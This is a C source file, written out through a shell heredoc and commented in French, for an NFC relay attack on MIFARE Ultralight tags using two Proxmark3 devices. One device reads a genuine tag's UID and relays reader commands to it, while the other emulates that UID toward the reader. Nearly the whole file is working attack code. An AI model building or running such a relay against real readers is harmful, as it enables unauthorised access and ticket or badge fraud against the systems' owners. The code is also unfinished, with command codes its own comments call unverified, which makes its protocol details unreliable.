cat << 'EOF' > full_relay.c
#include <windows.h>
#include <stdio.h>
#include <stdint.h>

//Valider le code 
/*Ouvre un terminal et lance : proxmark3.exe COM9 --flush.
Ensuite, tape une commande hf 14a raw. Regarde dans le dossier client/logs/ (si activé) 
ou utilise un Serial Port Monitor gratuit. Tu verras les octets exacts envoyés. Si tu vois 43 48 au début de chaque paquet, 
le code est sur la bonne voie.*/



#define PROXY_PORT "\\\\.\\COM9"
#define MOLE_PORT  "\\\\.\\COM10"

// Codes de commande PM3
//A verifier parce que peut etre pas bons
#define PM3_CMD_HF_ISO14443A_READER_RAW  0x0385
#define PM3_CMD_HF_ISO14443A_SIM_RAW     0x0386
#define PM3_CMD_HF_14A_SIM_SET_UID 0x0380

#pragma pack(push, 1)
typedef struct {
    uint16_t preamble; // 0x4348 ('CH')
    uint16_t length;
    uint16_t cmd; //id de la commande
    uint8_t  data[512];
    //Certaines versions demmandent un CRC16 à la fin
    //uint16_t crc; 
} PM3Packet;
#pragma pack(pop)


void hex_dump(const char* desc, void* addr, int len) {
    int i;
    unsigned char buff[17];
    unsigned char* pc = (unsigned char*)addr;
    if (desc != NULL) printf("%s:\n", desc);
    for (i = 0; i < len; i++) {
        if ((i % 16) == 0) {
            if (i != 0) printf("  %s\n", buff);
            printf("  %04x ", i);
        }
        printf(" %02x", pc[i]);
        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) buff[i % 16] = '.';
        else buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }
    while ((i % 16) != 0) { printf("   "); i++; }
    printf("  %s\n", buff);
}

uint16_t update_crc(uint8_t ch, uint16_t *lpw_crc) {
    ch = (ch ^ (uint8_t)((*lpw_crc) & 0x00FF));
    ch = (ch ^ (ch << 4));
    *lpw_crc = (*lpw_crc >> 8) ^ ((uint16_t)ch << 8) ^ ((uint16_t)ch << 3) ^ ((uint16_t)ch >> 4);
    return *lpw_crc;
}

void compute_crc_a(uint8_t *data, int len, uint8_t *crc_out) {
    uint16_t w_crc = 0x6363; // Valeur initiale ISO14443-A
    for (int i = 0; i < len; i++) {
        update_crc(data[i], &w_crc);
    }
    crc_out[0] = (uint8_t)(w_crc & 0xFF);
    crc_out[1] = (uint8_t)((w_crc >> 8) & 0xFF);
}

// Fonction pour configurer le port COM
HANDLE open_serial(const char* portName) {
    HANDLE hSerial = CreateFile(portName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hSerial == INVALID_HANDLE_VALUE) return INVALID_HANDLE_VALUE;

    DCB dcb = {0};
    dcb.DCBlength = sizeof(dcb);
    GetCommState(hSerial, &dcb);
    dcb.BaudRate = CBR_115200; //Si le sniffer reste vide, essaie de changer CBR_115200 par CBR_460800
    dcb.ByteSize = 8;
    dcb.StopBits = ONESTOPBIT;
    dcb.Parity   = NOPARITY;
    SetCommState(hSerial, &dcb);

    COMMTIMEOUTS timeouts = {0};
    timeouts.ReadIntervalTimeout = 1;
    timeouts.ReadTotalTimeoutConstant = 1;
    timeouts.ReadTotalTimeoutMultiplier = 1;
    SetCommTimeouts(hSerial, &timeouts);
    return hSerial;
}

// Extraction de l'UID (7 octets pour Ultralight)
void setup_proxy_with_real_uid(HANDLE hProxy, uint8_t* uid) {
    printf("[*] Configuration du Proxy avec l'UID du tag...\n");
    // On envoie l'UID au simulateur
    send_pm3_raw(hProxy, PM3_CMD_HF_14A_SIM_SET_UID, uid, 7);
}

// Fonction pour extraire l'UID du vrai tag via le Mole
int get_uid_from_mole(HANDLE hMole, uint8_t* out_uid) {
    uint8_t buffer[1024];
    DWORD bytes;
    PM3Packet* pkt = (PM3Packet*)buffer;

    printf("[*] Demarrage de la sequence d'anticollision sur le MOLE...\n");

    // 1. REQA (0x26) pour reveiller le tag
    uint8_t reqa = 0x26;
    send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, &reqa, 1);
    Sleep(50);
    if (!(ReadFile(hMole, buffer, sizeof(buffer), &bytes, NULL) && bytes >= 6)) return 0;

    // 2. ANTICOLLISION Cascade Level 1 (0x93 0x20)
    uint8_t cl1[] = {0x93, 0x20};
    send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, cl1, 2);
    Sleep(50);
    if (!(ReadFile(hMole, buffer, sizeof(buffer), &bytes, NULL) && bytes >= 6)) return 0;
    
    // Pour un UID de 7 octets, les 3 premiers octets de l'UID sont ici (après le CT 0x88)
    // Format attendu en CL1: [0x88] [UID0] [UID1] [UID2] [BCC]
    if (pkt->data[0] != 0x88) {
        printf("[!] Tag 4-byte detecte, adaptation...\n");
        memcpy(out_uid, pkt->data, 4); // Cas rare d'un UL 4-byte (très vieux)
        return 1;
    }
    memcpy(out_uid, &pkt->data[1], 3);

    // 3. SELECT Cascade Level 1 (0x93 0x70 + 5 octets reçus)
    uint8_t sel1[7] = {0x93, 0x70};
    memcpy(&sel1[2], pkt->data, 5);
    send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, sel1, 7);
    Sleep(50);
    ReadFile(hMole, buffer, sizeof(buffer), &bytes, NULL); // On purge le SAK

    // 4. ANTICOLLISION Cascade Level 2 (0x95 0x20)
    uint8_t cl2[] = {0x95, 0x20};
    send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, cl2, 2);
    Sleep(50);
    if (!(ReadFile(hMole, buffer, sizeof(buffer), &bytes, NULL) && bytes >= 6)) return 0;

    // Format attendu en CL2: [UID3] [UID4] [UID5] [UID6] [BCC]
    memcpy(&out_uid[3], pkt->data, 4);

    return 1; // UID de 7 octets complet dans out_uid


    /*Point d'attention : Lors du get_uid_from_mole, le SAK (Select Acknowledge) est crucial. 
    Pour un Ultralight, le SAK final doit être 0x00.
    Si le relai affiche un SAK de 0x04, le lecteur va croire que c'est un tag qui supporte l'ISO-DEP 
    (comme une carte bancaire) et le code libnfc va essayer d'envoyer des commandes RATS au lieu de READ.
    Vérifiee la sortie du sniffer : si on vois passer 0x04 après le SELECT CL2, 
    il faudra peut-être forcer le SAK à 0x00 dans l'initialisation de simulation*/
}


void sniff_ports(HANDLE hProxy, HANDLE hMole) {
    printf("\n[*] MODE SNIFFER ACTIF (5s)... Approchez un tag ou lancez une commande.\n");
    uint8_t buf[1024];
    DWORD bytes;
    DWORD start = GetTickCount();

    while (GetTickCount() - start < 5000) {
        if (ReadFile(hProxy, buf, sizeof(buf), &bytes, NULL) && bytes > 0) {
            hex_dump("SNIFF PROXY", buf, bytes);
        }
        if (ReadFile(hMole, buf, sizeof(buf), &bytes, NULL) && bytes > 0) {
            hex_dump("SNIFF MOLE", buf, bytes);
        }
        Sleep(10);
    }
    printf("[*] Fin du sniffing.\n\n");
}

// Envoyer une commande RAW au Proxmark
void send_pm3_raw(HANDLE h, uint16_t cmd, uint8_t* data, uint16_t len) {
    PM3Packet pkt = {0};
    pkt.preamble = 0x4843; // 'HC' pour indiquer une trame de commande (Host Command)
    pkt.cmd = cmd;
    pkt.length = len;
    if (len > 0 && data != NULL) {
        memcpy(pkt.data, data, len);
    }

    DWORD written;
    // On envoie le header (6 octets) + les datas
    if (!WriteFile(h, &pkt, 6 + len, &written, NULL)) {
        printf("[!] Erreur d'écriture sur le port COM\n");
    }
}

// Fonction de relai principale
void start_relay(HANDLE hProxy, HANDLE hMole) {
    uint8_t buffer[1024];
    DWORD bytesRead;

    printf("[*] Relai actif. En attente du lecteur...\n");

    while (1) {
        // 1. Lire depuis le PROXY (Lecteur -> PC)
        if (ReadFile(hProxy, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 6) {
            PM3Packet* pkt = (PM3Packet*)buffer;
            
            // On vérifie si c'est une trame reçue du lecteur
            if (pkt->preamble == 0x4348) {
                printf("[LECTEUR] Commande: %02X (len %d)\n", pkt->data[0], pkt->length);
                
                // 2. Relayer vers le MOLE (PC -> Tag)
                // On utilise la commande 'hf 14a raw' sur le Mole
                send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, pkt->data, pkt->length);

                // On boucle un peu car ReadFile peut être trop rapide
                int retry = 0;
                while (retry < 10) {
                    if (ReadFile(hMole, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 6) {
                        PM3Packet* resp = (PM3Packet*)buffer;
                        printf("[TAG] Réponse recue, renvoi au Proxy\n");
                        
                        // Si la réponse est une lecture de page (16 octets) ou une signature (32 octets)
                        // Le Proxmark en mode raw retire souvent le CRC, on doit le remettre pour le lecteur.
                        //PARTIE AJOUT DE CRC SI BESOIN
                        // if (resp->length == 16 || resp->length == 32 || resp->length == 8) {
                        //     printf("    [CRC] Calcul et ajout du CRC-A...\n");
                        //     compute_crc_a(resp->data, resp->length, &resp->data[resp->length]);
                        //     resp->length += 2; 
                        // }

                        // Renvoi au lecteur via le Proxy
                        send_pm3_raw(hProxy, PM3_CMD_HF_ISO14443A_READER_RAW, resp->data, resp->length);
                        break;
                    }
                    Sleep(5); //Si on voit que ca répond pas, tester en mettant sleep(1) ou en le supprimant (délais)
                    retry++;
                }
            }
        }
        Sleep(1);
    }
}

int main() {
    printf("=== RELAI PM3 ULTRALIGHT EXPERT ===\n");

    HANDLE hProxy = open_serial(PROXY_PORT);
    HANDLE hMole  = open_serial(MOLE_PORT);

    if (hProxy == INVALID_HANDLE_VALUE || hMole == INVALID_HANDLE_VALUE) {
        printf("[!] Erreur : Impossible d'ouvrir les ports COM.\n");
        return 1;
    }

    // 1. Sniffer pour vérifier les IDs de commande
    sniff_ports(hProxy, hMole);

    // --- INITIALISATION DES PM3 ---
    // On met le Mole en mode Reader
    printf("[*] Init Mole...\n");
    uint8_t init_reader[] = {0x01}; // Active l'antenne
    send_pm3_raw(hMole, 0x0380, init_reader, 1); 

    // 1. Récupération de l'UID réel sur le Mole
    uint8_t real_uid[7] = {0};
    if (get_uid_from_mole(hMole, real_uid)) {
        printf("[+] UID détecté : %02X%02X%02X%02X%02X%02X%02X\n", 
               real_uid[0], real_uid[1], real_uid[2], real_uid[3], 
               real_uid[4], real_uid[5], real_uid[6]);
    } else {
        printf("[!] Échec lecture UID. Utilisation d'un UID par défaut.\n");
        uint8_t default_uid[] = {0x04, 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE};
        memcpy(real_uid, default_uid, 7);
    }

    // On met le Proxy en mode Simulation (UID 7 octets bidon pour commencer)
    // Le but ici est que le Proxy accepte les commandes USB pendant la sim
    printf("[*] Init Proxy (Simulation)...\n");
    setup_proxy_with_real_uid(hProxy, real_uid);


    
    //uint8_t sim_setup[] = {0x07, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07}; 
    //send_pm3_raw(hProxy, PM3_CMD_HF_ISO14443A_SIM_RAW, sim_setup, 8);

    start_relay(hProxy, hMole);

    CloseHandle(hProxy);
    CloseHandle(hMole);
    return 0;
}
EOF